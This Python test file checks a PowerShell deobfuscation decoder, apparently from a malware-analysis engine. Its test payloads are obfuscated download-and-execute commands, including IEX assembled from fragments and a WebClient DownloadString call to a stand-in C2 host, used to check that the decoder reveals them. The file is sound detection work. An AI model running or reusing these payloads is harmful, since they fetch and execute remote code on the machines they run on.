"""RC2.6 P0.3 · PowerShell reconstruction extensions.

Locks the new capabilities added on top of RC2.3 P0.1/P0.2:

  P0.3.a — reconstruct-then-invoke confidence boost so the ps-reconstruct
           decoder wins the orchestrator race against extract-wrapper
           when the payload has both a reconstruction signal AND a
           `& $var` / `IEX $var` invocation.

  P0.3.b — `[ScriptBlock]::Create('cmd')` and
           `[scriptblock]::Create("cmd")` unwrap into a plain string
           literal.

  P0.3.c — after all reconstruction passes, `& $var` / `IEX $var` /
           `Invoke-Expression $var` invocations get the resolved literal
           embedded inline so keywords surface for MITRE + IOC extractors.
"""
from __future__ import annotations

import pytest

from engine import AnalysisContext, Budget, Orchestrator  # side-effect: imports registry
import decoders  # noqa: F401 — triggers plugin registration
from decoders.ps_reconstruct import PowerShellReconstructDecoder
from engine.models import AnalysisContext as _Ctx, Budget as _Bud, Fingerprint


def _fp(payload: str) -> Fingerprint:
    """Minimal fingerprint for detect() unit tests — real detection code
    only reads a couple of fields; everything else uses safe defaults."""
    return Fingerprint(
        input_len=len(payload),
        printable_ratio=1.0,
        english_density=0.5,
        entropy=4.0,
        is_binary=False,
    )


@pytest.fixture()
def decoder():
    return PowerShellReconstructDecoder()


@pytest.fixture()
def ctx():
    return _Ctx(budget=_Bud(wall_time_ms=4000))


def _trace_text(report) -> str:
    """Concat final output + every trace preview — matches the RC2.3
    benchmark's chain-completeness haystack."""
    hay = (report.output or "")
    for step in report.trace:
        hay += "\n" + (step.preview or "")
    return hay


# ---------------------------------------------------------------- #
#  P0.3.a — confidence boost for reconstruct + invocation combo
# ---------------------------------------------------------------- #
def test_reconstruct_then_invoke_beats_extract_wrapper():
    """`$a=('I','E','X')-join''; & $a http://x` must surface IEX in trace.

    Baseline: extract-wrapper (0.65) beat ps-reconstruct (0.6). After
    P0.3, ps-reconstruct hits conf 0.9 on the combo and fires FIRST so
    `IEX` reaches downstream MITRE / IOC extractors via the trace haystack.
    """
    payload = "$a = ('I','E','X') -join ''; & $a (New-Object Net.WebClient).DownloadString('http://c2.local/s.ps1')"
    report = Orchestrator(_Ctx(budget=_Bud(wall_time_ms=4000))).run(payload)
    hay = _trace_text(report)
    assert "IEX" in hay
    assert "http://c2.local/s.ps1" in hay
    # ps-reconstruct MUST appear in the chain (proves it won the race)
    assert "ps-reconstruct" in [s.decoder for s in report.trace]


def test_confidence_stays_low_without_reconstruction_or_invocation(decoder, ctx):
    """Plain PowerShell with backticks alone → single mild signal, low conf."""
    payload = "Get-Pr`ocess"
    r = decoder.detect(payload, _fp(payload), ctx)
    # ps-backtick alone → 1 signal → conf 0.6
    assert r.confidence <= 0.6


def test_confidence_boosted_only_when_invocation_meaningful(decoder, ctx):
    """`& $var` with a literal string assignment IS a legit reveal target
    (helps analysts see what would be executed). Expect the boost to
    apply — this locks the intended P0.3 behaviour."""
    payload = "$a = 'unrelated'; & $a"
    r = decoder.detect(payload, _fp(payload), ctx)
    # Two signals (ps-var-expand + ps-invoke-var) → conf 0.9
    assert r.confidence >= 0.85


# ---------------------------------------------------------------- #
#  P0.3.b — [ScriptBlock]::Create() unwrap
# ---------------------------------------------------------------- #
def test_scriptblock_create_single_quote_unwrap(decoder, ctx):
    payload = "[ScriptBlock]::Create('IEX (New-Object Net.WebClient).DownloadString(\"http://x\")')"
    r = decoder.detect(payload, _fp(payload), ctx)
    assert r.confidence > 0.0
    result = decoder.decode(payload, {}, ctx)
    assert "[ScriptBlock]::Create" not in result.output
    assert "IEX" in result.output


def test_scriptblock_create_lowercase_double_quote(decoder, ctx):
    payload = '[scriptblock]::Create("Get-Process")'
    result = decoder.decode(payload, {}, ctx)
    assert "Get-Process" in result.output
    assert "[scriptblock]::Create" not in result.output


def test_scriptblock_create_fully_qualified_type(decoder, ctx):
    payload = "[System.Management.Automation.ScriptBlock]::Create('whoami')"
    result = decoder.decode(payload, {}, ctx)
    assert "whoami" in result.output
    # Fully-qualified prefix removed alongside ::Create call
    assert "::Create" not in result.output


# ---------------------------------------------------------------- #
#  P0.3.c — invoke-var reveal
# ---------------------------------------------------------------- #
def test_invoke_var_reveal_ampersand(decoder, ctx):
    """`$s='IEX'; & $s http://x` — after reveal, `'IEX'` appears next to `& $s`."""
    payload = "$s = 'IEX'; & $s (iwr http://x/a.ps1).Content"
    result = decoder.decode(payload, {}, ctx)
    # The invoke-var reveal appends the resolved literal after `& $s`
    assert "IEX" in result.output


def test_invoke_var_reveal_iex_keyword(decoder, ctx):
    payload = "$c = 'powershell -c calc.exe'; IEX $c"
    result = decoder.decode(payload, {}, ctx)
    # Resolved literal must be visible for MITRE / LOLBAS extractors
    assert "powershell -c calc.exe" in result.output


def test_invoke_var_reveal_invoke_expression_full(decoder, ctx):
    payload = "$k = 'whoami'; Invoke-Expression $k"
    result = decoder.decode(payload, {}, ctx)
    assert "whoami" in result.output


def test_invoke_var_only_fires_when_var_assigned(decoder, ctx):
    """`& $undefined` (no assignment) — reveal must be a no-op."""
    payload = "& $undefined some args"
    result = decoder.decode(payload, {}, ctx)
    # Nothing to reveal; original payload returned unchanged (or minimal
    # cosmetic passes at most). Reveal marker must NOT appear.
    assert "<#=>" not in result.output


# ---------------------------------------------------------------- #
#  Guards — RC2.3 P0.1/P0.2 behaviours must still hold
# ---------------------------------------------------------------- #
def test_char_decimal_still_works(decoder, ctx):
    payload = "[char]73+[char]69+[char]88"
    result = decoder.decode(payload, {}, ctx)
    assert "IEX" in result.output


def test_join_array_still_works(decoder, ctx):
    payload = "('I','E','X') -join ''"
    result = decoder.decode(payload, {}, ctx)
    assert "IEX" in result.output


def test_format_operator_still_works(decoder, ctx):
    payload = '"{2}{0}{1}" -f "E","X","I"'
    result = decoder.decode(payload, {}, ctx)
    assert "IEX" in result.output


def test_dot_replace_still_works(decoder, ctx):
    payload = "('IZZEZZX').Replace('ZZ','')"
    result = decoder.decode(payload, {}, ctx)
    assert "IEX" in result.output
